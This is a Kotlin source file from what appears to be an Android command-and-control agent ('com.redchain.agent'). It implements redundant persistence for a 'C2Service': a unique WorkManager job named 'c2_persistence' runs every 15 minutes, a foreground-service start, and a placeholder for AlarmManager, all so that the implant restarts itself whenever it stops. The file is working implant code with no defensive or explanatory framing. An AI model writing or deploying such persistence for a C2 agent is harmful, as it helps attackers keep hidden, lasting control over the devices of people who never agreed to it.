package com.redchain.agent.utils

import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.work.*
import com.redchain.agent.service.C2Service
import java.util.concurrent.TimeUnit

/**
 * Persistence manager - keep service running
 * Multiple redundancy layers
 */
object PersistenceManager {

    /**
     * Setup all persistence mechanisms
     */
    fun setupPersistence(context: Context) {
        // 1. WorkManager periodic check
        setupWorkManager(context)

        // 2. Start service
        startService(context)

        // 3. Setup alarm (deprecated but works on old devices)
        setupAlarm(context)
    }

    private fun setupWorkManager(context: Context) {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val workRequest = PeriodicWorkRequestBuilder<PersistenceWorker>(
            15, TimeUnit.MINUTES  // Minimum interval
        )
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
            "c2_persistence",
            ExistingPeriodicWorkPolicy.KEEP,
            workRequest
        )
    }

    private fun startService(context: Context) {
        val intent = Intent(context, C2Service::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent)
        } else {
            context.startService(intent)
        }
    }

    private fun setupAlarm(context: Context) {
        // TODO: Use AlarmManager for older Android versions
        // This provides additional redundancy
    }
}

/**
 * Worker to ensure service is running
 */
class PersistenceWorker(
    context: Context,
    params: WorkerParameters
) : Worker(context, params) {

    override fun doWork(): Result {
        // Check if service is running, restart if needed
        val intent = Intent(applicationContext, C2Service::class.java)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            applicationContext.startForegroundService(intent)
        } else {
            applicationContext.startService(intent)
        }

        return Result.success()
    }
}
